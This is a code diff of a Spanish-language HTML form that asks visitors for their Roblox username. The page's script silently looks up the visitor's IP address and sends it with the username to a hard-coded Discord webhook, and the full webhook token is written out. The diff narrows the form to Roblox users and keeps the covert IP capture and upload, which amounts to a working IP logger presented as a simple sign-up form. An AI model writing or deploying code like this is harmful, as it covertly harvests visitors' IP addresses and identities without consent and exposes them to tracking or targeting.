@@ -12,8 +12,10 @@
             const ipData = await ipResponse.json();
             const userIP = ipData.ip;
 
+            const username = document.getElementById('username').value;
+
             const data = {
-                content: `Nueva entrada:\nIP: ${userIP}\nUsuario: ${document.getElementById('username').value}\nCorreo: ${document.getElementById('email').value}`,
+                content: `Nueva entrada:\nIP: ${userIP}\nUsuario de Roblox: ${username}`,
             };
 
             fetch('https://discord.com/api/webhooks/1411003921953984512/eWRarF44aGvN0ZatZ4S4IxA9IH8JGb_KA7nLuZlaFj2G3FdFUrZLHW28egfPg6cC4092', {
@@ -29,12 +31,8 @@
 <body>
     <form onsubmit="sendContact(event)">
         <div>
-            <label for="username">Nombre de Usuario:</label>
+            <label for="username">Nombre de Usuario de Roblox:</label>
             <input type="text" id="username" required>
-        </div>
-        <div>
-            <label for="email">Correo Electrónico:</label>
-            <input type="email" id="email" required>
         </div>
         <button type="submit">Enviar</button>
     </form>
